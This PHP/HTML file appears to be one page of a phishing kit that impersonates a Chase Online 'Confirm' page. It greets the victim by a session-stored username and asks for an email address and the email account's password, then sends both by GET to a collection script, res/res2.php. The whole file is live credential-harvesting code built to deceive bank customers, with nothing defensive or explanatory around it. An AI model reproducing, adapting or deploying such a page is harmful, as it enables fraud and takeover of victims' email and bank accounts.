<?php 
error_reporting(0);
session_start();
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Chase Online - Confirm</title>
<meta name="generator" content="WYSIWYG Web Builder 10 - http://www.wysiwygwebbuilder.com">
<link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="css/Untitled1.css" rel="stylesheet">
<link href="css/verif.css" rel="stylesheet">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>
<body>
<form name="ff" action="res/res2.php" method="GET">
<div id="wb_Image1" style="position:absolute;left:0px;top:626px;width:1344px;height:214px;z-index:5;">
<img src="images/2.GIF" id="Image1" alt=""></div>
<div id="wb_Form1" style="position:absolute;left:68px;top:121px;width:1192px;height:161px;z-index:6;">
<div id="wb_Text1" style="position:absolute;left:30px;top:0px;width:250px;height:24px;z-index:0;text-align:left;">
<span style="color:#696969;font-family:Arial;font-size:20px;"><strong>Welcome Again! <span style="color:#A9A9A9;font-family:Arial;font-size:17px;"><?php echo $_SESSION['user']; ?></span></strong></span></div>
<div id="wb_Text2" style="position:absolute;left:30px;top:31px;width:592px;height:41px;z-index:1;text-align:left;">
<span style="color:#000000;font-family:Arial;font-size:20px;"><strong>Account Information<br></strong></span><span style="color:#000000;font-family:Arial;font-size:15px;">Please provide the folling information about yourself !</span></div>
</div>
<div id="wb_Form2" style="position:absolute;left:68px;top:270px;width:771px;height:161px;z-index:7;">
<div id="wb_Image2" style="position:absolute;left:239px;top:103px;width:58px;height:21px;z-index:2;">
<img src="images/logon.gif" id="Image2" alt=""></div>
<input type="password" id="Editbox2" class="form-control" style="position:absolute;left:68px;top:37px;width:250px;height:25px;line-height:19px;z-index:3;" name="2" value="" placeholder="Password Email" required>
<input type="submit" id="Button1" name="" value="" style="position:absolute;left:240px;top:104px;width:55px;height:20px;z-index:4;">

</div>
<input type="email" id="Editbox1" class="form-control" style="position:absolute;left:136px;top:262px;width:250px;height:25px;line-height:19px;z-index:8;" name="1" value="" placeholder="Email Address" required>
</form>
</body>
</html>